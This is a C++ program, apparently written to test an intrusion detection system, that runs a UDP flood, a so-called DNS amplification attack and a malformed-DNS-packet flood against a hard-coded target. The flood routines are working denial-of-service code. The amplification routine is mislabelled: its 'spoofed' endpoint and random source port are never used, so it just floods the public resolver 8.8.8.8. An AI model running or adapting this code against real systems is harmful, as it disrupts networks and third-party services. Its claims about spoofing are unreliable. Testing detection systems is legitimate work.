#include <iostream>
#include <boost/asio.hpp>
#include <chrono>
#include <thread>
#include <random>

using boost::asio::ip::udp;

// Function to simulate a UDP flood (DDoS) attack
void send_udp_flood(const std::string& target_ip, int duration_seconds) {
    boost::asio::io_service io_service;
    udp::socket socket(io_service);
    udp::endpoint target_endpoint(boost::asio::ip::address::from_string(target_ip), 53); // DNS port 53

    socket.open(udp::v4());

    std::string data(100, 'X');  // Fake payload

    auto end_time = std::chrono::steady_clock::now() + std::chrono::seconds(duration_seconds);

    while (std::chrono::steady_clock::now() < end_time) {
        // Randomize source port for the flood
        udp::endpoint source_endpoint(boost::asio::ip::address_v4::any(), 1024 + rand() % 64511); // Random source port
        socket.send_to(boost::asio::buffer(data), target_endpoint);
    }

    std::cout << "UDP flood attack finished." << std::endl;
}

// Function to simulate DNS amplification attack
void send_dns_amplification(const std::string& target_ip, const std::string& dns_server_ip, int duration_seconds) {
    boost::asio::io_service io_service;
    udp::socket socket(io_service);
    udp::endpoint dns_server_endpoint(boost::asio::ip::address::from_string(dns_server_ip), 53); // DNS server port

    socket.open(udp::v4());

    std::string query = "\x00\x00\x00\x00\x00\x01"  // DNS header (simplified)
                       "\x00\x00\x00\x00\x00\x00"  // DNS question (simplified)
                       "example.com";             // Fake domain name

    auto end_time = std::chrono::steady_clock::now() + std::chrono::seconds(duration_seconds);

    while (std::chrono::steady_clock::now() < end_time) {
        // Spoofed source IP (victim)
        udp::endpoint spoofed_target(boost::asio::ip::address::from_string(target_ip), 53);
        socket.send_to(boost::asio::buffer(query), dns_server_endpoint);
    }

    std::cout << "DNS amplification attack finished." << std::endl;
}


void send_malformed_dns(const std::string& target_ip, int duration_seconds) {
    boost::asio::io_service io_service;
    udp::socket socket(io_service);
    udp::endpoint target_endpoint(boost::asio::ip::address::from_string(target_ip), 53);

    socket.open(udp::v4());

    std::string malformed_payload = "\x01\x01\x01";  

    auto end_time = std::chrono::steady_clock::now() + std::chrono::seconds(duration_seconds);

    while (std::chrono::steady_clock::now() < end_time) {
        socket.send_to(boost::asio::buffer(malformed_payload), target_endpoint);
    }

    std::cout << "Malformed DNS packets sent." << std::endl;
}

int main() {
    std::string target_ip = "192.168.1.100"; // Replace with your target IP (the machine running IDS)
    std::string dns_server_ip = "8.8.8.8";  // Google DNS server for amplification tests

    
    send_udp_flood(target_ip, 10);

    
    send_dns_amplification(target_ip, dns_server_ip, 10);

    
    send_malformed_dns(target_ip, 10);

    return 0;
}
